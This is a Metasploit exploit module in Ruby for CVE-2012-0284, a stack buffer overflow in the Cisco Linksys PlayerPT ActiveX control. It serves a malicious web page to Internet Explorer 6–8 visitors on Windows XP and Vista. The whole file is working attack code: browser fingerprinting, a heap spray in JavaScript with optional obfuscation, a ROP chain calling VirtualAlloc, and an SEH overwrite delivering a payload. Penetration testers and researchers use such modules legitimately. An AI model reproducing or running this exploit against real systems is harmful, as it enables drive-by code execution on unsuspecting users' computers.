# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::Seh
    include Msf::Exploit::Remote::BrowserAutopwn
 
    autopwn_info({
        :ua_name    => HttpClients::IE,
        :ua_minver  => "6.0",
        :ua_maxver  => "8.0",
        :javascript => true,
        :os_name    => OperatingSystems::WINDOWS,
        :classid    => "{9E065E4A-BD9D-4547-8F90-985DC62A5591}",
        :method     => "SetSource",
        :rank       => NormalRanking
    })
 
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Cisco Linksys PlayerPT ActiveX Control Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Cisco Linksys PlayerPT 1.0.0.15
                as the installed with the web interface of Cisco Linksys WVC200 Wireless-G PTZ
                Internet Video Camera. The vulnerability, due to the insecure usage of sprintf in
                the SetSource method, allows to trigger a stack based buffer overflow which leads
                to code execution under the context of the user visiting a malicious web page.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Carsten Eiram&#039;, # Vulnerability Discovery
                    &#039;rgod&#039;, # PoC
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;80297&#039; ],
                    [ &#039;CVE&#039;, &#039;2012-0284&#039; ],
                    [ &#039;BID&#039;, &#039;54588&#039; ],
                    [ &#039;EDB&#039;, &#039;18641&#039; ],
                    [ &#039;URL&#039;, &#039;http://secunia.com/secunia_research/2012-25/&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
 
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 1024,
                    &#039;DisableNops&#039; => true,
                    &#039;BadChars&#039;    => "\x00\x0d\x0a\x5c",
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # Cisco Linksys PlayerPT ActiveX Control 1.0.0.15
                    [ &#039;Automatic&#039;, { } ],
                    [
                        &#039;IE 6 on Windows XP SP3&#039;,
                        {
                            &#039;Spray&#039; => true,
                            &#039;SprayBlocks&#039; => 0x185,
                            &#039;SprayOffset&#039; => &#039;0x0&#039;,
                            &#039;OffsetStackBottom&#039; => 8556
                        }
                    ],
                    [
                        &#039;IE 7 on Windows XP SP3 / Windows Vista SP2&#039;,
                        {
                            &#039;Spray&#039; => true,
                            &#039;SprayBlocks&#039; => 0x185,
                            &#039;SprayOffset&#039; => &#039;0x0&#039;,
                            &#039;OffsetStackBottom&#039; => 3220
                        }
                    ],
                    [
                        &#039;IE 8 on Windows XP SP3&#039;,
                        {
                            &#039;Spray&#039; => false,
                            &#039;OffsetRop&#039; => 160,
                            &#039;Offset&#039; => 456,
                            &#039;Ret&#039; => 0x1002c536, # ADD ESP,0A2C # RETN from PlayerPT.ocx
                            &#039;OffsetStackBottom&#039; => 4108
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Mar 22 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
            ], self.class
        )
 
    end
 
    def get_spray(t, js_code, js_nops)
 
        spray = <<-JS
        var heap_obj = new heapLib.ie(0x20000);
        var code = unescape("#{js_code}");
        var nops = unescape("#{js_nops}");
 
        while (nops.length < 0x80000) nops += nops;
 
        var offset = nops.substring(0, #{t[&#039;SprayOffset&#039;]});
        var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
 
        while (shellcode.length < 0x40000) shellcode += shellcode;
        var block = shellcode.substring(0, (0x80000-6)/2);
 
        heap_obj.gc();
        for (var z=1; z < #{t[&#039;SprayBlocks&#039;]}; z++) {
            heap_obj.alloc(block);
        }
 
        JS
 
        return spray
 
    end
 
    # rop chain generated with mona.py
    def create_rop_chain()
 
        rop_gadgets =
            [
                0x77c2f271, # POP EBP # RETN [msvcrt.dll]
                0x77c2f271, # skip 4 bytes [msvcrt.dll]
                0x77c5335d, # POP EBX # RETN [msvcrt.dll]
                0xffffffff, #
                0x77c127e1, # INC EBX # RETN [msvcrt.dll]
                0x77c127e1, # INC EBX # RETN [msvcrt.dll]
                0x77c4e392, # POP EAX # RETN [msvcrt.dll]
                0x2cfe1467, # put delta into eax (-> put 0x00001000 into edx)
                0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
                0x77c58fbc, # XCHG EAX,EDX # RETN [msvcrt.dll]
                0x77c34de1, # POP EAX # RETN [msvcrt.dll]
                0x2cfe04a7, # put delta into eax (-> put 0x00000040 into ecx)
                0x77c4eb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
                0x77c14001, # XCHG EAX,ECX # RETN [msvcrt.dll]
                0x77c479e2, # POP EDI # RETN [msvcrt.dll]
                0x77c39f92, # RETN (ROP NOP) [msvcrt.dll]
                0x77c3b8ba, # POP ESI # RETN [msvcrt.dll]
                0x77c2aacc, # JMP [EAX] [msvcrt.dll]
                0x77c4e392, # POP EAX # RETN [msvcrt.dll]
                0x77c1110c, # ptr to &VirtualAlloc() [IAT msvcrt.dll]
                0x77c12df9, # PUSHAD # RETN [msvcrt.dll]
                0x77c51025, # ptr to &#039;push esp #  ret &#039; [msvcrt.dll]
            ].pack("V*")
 
        return rop_gadgets
    end
 
    def get_payload(my_target)
 
        case my_target.name
        when /IE 6 on Windows XP SP3/
            my_payload = "\x0c" * my_target[&#039;OffsetStackBottom&#039;]
            return my_payload
        when /IE 7 on Windows XP SP3 \/ Windows Vista SP2/
            my_payload = "\x0c" * my_target[&#039;OffsetStackBottom&#039;]
            return my_payload
        when /IE 8 on Windows XP SP3/
            my_payload = rand_text_alpha(my_target[&#039;OffsetRop&#039;])
            my_payload << create_rop_chain
            my_payload << make_nops(my_target[&#039;Offset&#039;] - my_payload.length)
            my_payload << generate_seh_record(my_target.ret)
            my_payload << payload.encoded
            my_payload << rand_text_alpha(my_target[&#039;OffsetStackBottom&#039;] - my_payload.length)
            return my_payload
        end
 
    end
 
    def get_target(agent)
        #If the user is already specified by the user, we&#039;ll just use that
        return target if target.name != &#039;Automatic&#039;
        if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
            return targets[1] #IE 6 on Windows XP SP3
        elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
            return targets[2] #IE 7 on Windows XP SP3
        elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
            return targets[3] #IE 8 on Windows XP SP3
        elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
            return targets[2] #IE 7 on Windows Vista SP2
        else
            return nil
        end
    end
 
    def on_request_uri(cli, request)
 
        agent = request.headers[&#039;User-Agent&#039;]
        print_status("User-agent: #{agent}")
 
        my_target = get_target(agent)
 
        # Avoid the attack if the victim doesn&#039;t have a setup we&#039;re targeting
        if my_target.nil?
            print_error("Browser not supported: #{agent}")
            send_not_found(cli)
            return
        end
 
        js = ""
 
        if my_target[&#039;Spray&#039;]
            p = payload.encoded
            js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
            js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))
            js = get_spray(my_target, js_code, js_nops)
 
            js = heaplib(js, {:noobfu => true})
 
            if datastore[&#039;OBFUSCATE&#039;]
                js = ::Rex::Exploitation::JSObfu.new(js)
                js.obfuscate
            end
        end
 
        sploit = get_payload(my_target)
        sploit = sploit.gsub(/"/, "\\\"")
 
        html = <<-MYHTML
        <html>
        <head>
        <script>
        #{js}
        </script>
        </head>
        <body>
        <object classid=&#039;clsid:9E065E4A-BD9D-4547-8F90-985DC62A5591&#039; id=&#039;obj&#039; /></object>
        <script>
            obj.SetSource("","","","","#{sploit}");
        </script>
        </body>
        </html>
        MYHTML
 
        html = html.gsub(/^\t\t/, &#039;&#039;)
 
        print_status("Sending html")
        send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
    end
end



